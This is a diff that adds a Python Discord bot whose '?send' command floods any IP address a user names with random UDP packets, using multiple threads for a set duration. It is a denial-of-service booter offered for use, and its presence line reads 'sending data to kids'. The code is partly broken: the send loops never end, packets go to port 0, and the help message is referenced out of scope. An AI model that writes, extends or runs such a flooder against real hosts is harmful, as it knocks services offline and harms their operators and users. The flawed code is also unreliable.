@@ -1,0 +1,103 @@
+import discord
+import socket
+import random
+import string
+import asyncio
+import threading
+import time
+
+LOGO = r'''
+  
+     ▄████████     ███        ▄████████    ▄████████  ▄█        ▄█  ███▄▄▄▄      ▄████████ 
+  ███    ███ ▀█████████▄   ███    ███   ███    ███ ███       ███  ███▀▀▀██▄   ███    ███ 
+  ███    █▀     ▀███▀▀██   ███    ███   ███    ███ ███       ███▌ ███   ███   ███    █▀  
+  ███            ███   ▀   ███    ███  ▄███▄▄▄▄██▀ ███       ███▌ ███   ███  ▄███▄▄▄     
+▀███████████     ███     ▀███████████ ▀▀███▀▀▀▀▀   ███       ███▌ ███   ███ ▀▀███▀▀▀     
+         ███     ███       ███    ███ ▀███████████ ███       ███  ███   ███   ███    █▄  
+   ▄█    ███     ███       ███    ███   ███    ███ ███▌    ▄ ███  ███   ███   ███    ███ 
+ ▄████████▀     ▄████▀     ███    █▀    ███    ███ █████▄▄██ █▀    ▀█   █▀    ██████████ 
+                                        ███    ███ ▀                                                                    
+     
+'''
+print(LOGO)
+
+client = discord.Client(intents=discord.Intents.all())
+
+@client.event
+async def on_ready():
+    print(f'We have logged in as {client.user}')
+    
+
+    await client.change_presence(activity=discord.Game(name="sending data to kids"))
+
+@client.event
+async def on_message(message):
+    if message.author == client.user:
+        return
+
+    if message.content.startswith('?help'):
+         help_msg = "```" + \
+           "?send <ip_address> <duration> [<num_threads>]\n" + \
+           "\n" + \
+           "Sends random data to the specified IP address for the specified duration using the specified number of threads (default: 1).\n" + \
+           "\n" + \
+           "  <ip_address>     The IP address to send data to.\n" + \
+           "  <duration>       The duration to send data for in seconds.\n" + \
+           "  <num_threads>    The number of threads to use for sending data (default: 1).\n" + \
+           "  cmd will be like ?send <ip> <duration> <num_threads> .\n" + \
+           "```"
+
+         
+    await message.channel.send(help_msg)
+
+    if message.content.startswith('?send'):
+        args = message.content.split()
+        if len(args) < 3:
+            await message.channel.send('Invalid syntax. Usage: ?send <ip_address> <duration> [<num_threads>]')
+            return
+
+        ip_address = args[1]
+        duration = float(args[2])
+        num_threads = int(args[3]) if len(args) > 3 else 1
+
+        await message.channel.send(f'Sending data to {ip_address} for {duration} seconds using {num_threads} thread(s)...')
+
+         
+        message = ''.join(random.choices(string.ascii_letters + string.digits, k=1024)).encode()
+
+         
+        def send_data():
+            try:
+                while True:
+                    s.sendto(message, (ip_address, 0))
+                    print(f'Sent data to {ip_address}')
+                    time.sleep(0.001)
+            except Exception as e:
+                print(f'Could not send data to {ip_address}: {e}')
+
+         
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+         
+        threads = []
+        for i in range(num_threads):
+            t = threading.Thread(target=send_data)
+            threads.append(t)
+            t.start()
+
+         
+        await asyncio.sleep(duration)
+        for t in threads:
+            t.join()
+
+         
+        s.close()
+
+        await message.channel.send(f'Finished sending data to {ip_address}')
+
+
+
+ 
+
+
+client.run('put your token hear')
